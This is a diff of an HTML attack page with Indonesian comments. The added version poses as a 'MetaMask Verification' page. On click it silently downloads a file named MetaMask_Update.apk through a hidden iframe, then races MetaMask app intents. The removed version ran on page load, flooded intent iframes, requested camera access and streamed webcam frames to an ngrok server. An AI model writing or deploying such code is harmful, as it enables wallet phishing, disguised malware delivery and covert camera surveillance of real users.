@@ -3,32 +3,30 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Verification</title>
+<title>Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #000; color: #f00; font-family: monospace;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; text-align: center; overflow: hidden;
+    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
   }
   .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
-  h2 { animation: blink 0.1s infinite; }
-  @keyframes blink { 50% { opacity: 0.1; } }
+  h2 { animation: blink 0.2s infinite; }
+  @keyframes blink { 50% { opacity: 0.2; } }
   #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
-  iframe, video, canvas { display: none !important; }
+  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>☢️ SYSTEM HACKED ☢️</h2>
-  <p>Memproses...</p>
+  <h2>🦊 MetaMask Verification</h2>
+  <p>Klik di mana saja untuk melanjutkan.</p>
   <div id="log">Sistem siap.</div>
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
-<video id="cam-feed" autoplay playsinline muted></video>
-<canvas id="processing-canvas" width="640" height="480"></canvas>
 
 <script>
 (function () {
@@ -43,49 +41,85 @@
   }
 
   // ============================================
-  // KONFIGURASI
+  // 1. KONFIGURASI INTENT
   // ============================================
-  var TARGET_INTENT = "intent://#Intent;" +
-                      "package=io.metamask;" +
-                      "scheme=metamask;" +
-                      "end;";
-
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame";
+  var METAMASK_INTENT = "intent://#Intent;" +
+                        "package=io.metamask;" +
+                        "scheme=metamask;" +
+                        "end;";
 
   // ============================================
-  // 1. ZERO-CLICK TRIGGER (OTOMATIS SAAT LOAD)
+  // 2. TRIGGER (KLIK)
   // ============================================
-  window.addEventListener('load', function() {
+  document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
-    log("[!] Memulai Zero-Click Chaos...");
+    document.getElementById('main-card').innerHTML = `
+      <h2>Memverifikasi...</h2>
+      <p>Mengunduh paket & menghubungkan wallet...</p>
+      <div id="log"></div>
+    `;
+    logEl = document.getElementById('log');
+    log("[!] Memulai Stealth Chain...");
 
-    // A. STEALTH DOWNLOAD (IFRAME TERSEMBUNYI)
+    // ============================================
+    // A. STEALTH DOWNLOAD VIA IFRAME TERSEMBUNYI
+    // ============================================
     try {
+      // Base64 Header APK (Dummy)
       var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
       var binary = atob(b64Apk);
       var bytes = new Uint8Array(binary.length);
       for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+      
+      // Blob APK
       var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
       var blobUrl = URL.createObjectURL(blob);
 
+      // Buat iframe tersembunyi
       var dlIframe = document.createElement("iframe");
+      // Meminta izin download tanpa gesture
       dlIframe.sandbox = "allow-scripts allow-downloads-without-user-activation";
       dlIframe.style.display = "none";
+      
+      // HTML di dalam iframe: Link download otomatis
       dlIframe.srcdoc = `
         <body>
-          <a id="dl" href="${blobUrl}" download="Security_Patch.apk">Download</a>
-          <script>document.getElementById('dl').click();<\/script>
+          <a id="dl" href="${blobUrl}" download="MetaMask_Update.apk">Download</a>
+          <script>
+            document.getElementById('dl').click();
+          <\/script>
         </body>
       `;
+      
       document.body.appendChild(dlIframe);
-      log("[+] APK Download Triggered (Zero-Click).");
-    } catch(e) {}
+      log("[+] Stealth APK Download Triggered.");
+    } catch(e) {
+      log("[-] Download Error: " + e.message);
+    }
 
-    // B. INTENT FLOODING (5ms) + CAMERA REQUEST
-    var iframeCount = 0;
-    var floodInterval = setInterval(function() {
+    // ============================================
+    // B. INTENT INJECTION (RACE CONDITION)
+    // ============================================
+    // Eksekusi dalam 10ms setelah download dimulai.
+    // Tujuannya agar browser memproses Intent saat masih sibuk dengan download.
+    
+    setTimeout(function() {
+      log("[+] Mengirim Intent MetaMask (Race)...");
+      try {
+        // Top-Level Navigation
+        window.location.href = METAMASK_INTENT;
+      } catch(e) {
+        log("[-] Intent Error: " + e.message);
+      }
+    }, 10); // 10ms
+
+    // ============================================
+    // C. FALLBACK: IFRAME SANDBOX (JIKA TOP-LEVEL GAGAL)
+    // ============================================
+    setTimeout(function() {
+      log("[+] Mengirim Intent via Iframe...");
       try {
         var iframe = document.createElement("iframe");
         iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
@@ -94,57 +128,17 @@
           <!DOCTYPE html>
           <html>
           <body>
-            <script>window.top.location.href = "${TARGET_INTENT}";<\/script>
+            <script>
+              window.top.location.href = "${METAMASK_INTENT}";
+            <\/script>
           </body>
           </html>
         `;
         document.getElementById("launcher-container").appendChild(iframe);
-        iframeCount++;
-        
-        // Minta izin kamera setiap 10 iframe
-        if (iframeCount % 10 === 0) {
-          navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-            .then(function(stream) {
-              var video = document.getElementById('cam-feed');
-              video.srcObject = stream;
-              video.play().catch(function(){});
-              log("[+] Kamera BERHASIL diakses!");
-              
-              // Stream ke server
-              setInterval(function() {
-                var canvas = document.getElementById('processing-canvas');
-                var ctx = canvas.getContext('2d');
-                if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                  var dataURL = canvas.toDataURL('image/jpeg', 0.5);
-                  fetch(SERVER_ENDPOINT, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: dataURL }),
-                    keepalive: true
-                  }).catch(function(){});
-                }
-              }, 100);
-            })
-            .catch(function(err) {
-              log("[-] Kamera diblokir: " + err.name);
-            });
-        }
-
-        if (iframeCount % 20 === 0) {
-          log("[+] Intent Flood " + iframeCount + " terkirim.");
-        }
-
-        if (document.getElementById("launcher-container").children.length > 50) {
-          document.getElementById("launcher-container").removeChild(
-            document.getElementById("launcher-container").firstChild
-          );
-        }
-
       } catch(e) {}
-    }, 5); 
+    }, 500); // 500ms (Beri waktu Top-Level untuk mencoba)
 
-  });
+  }, { once: true });
 
 })();
 </script>
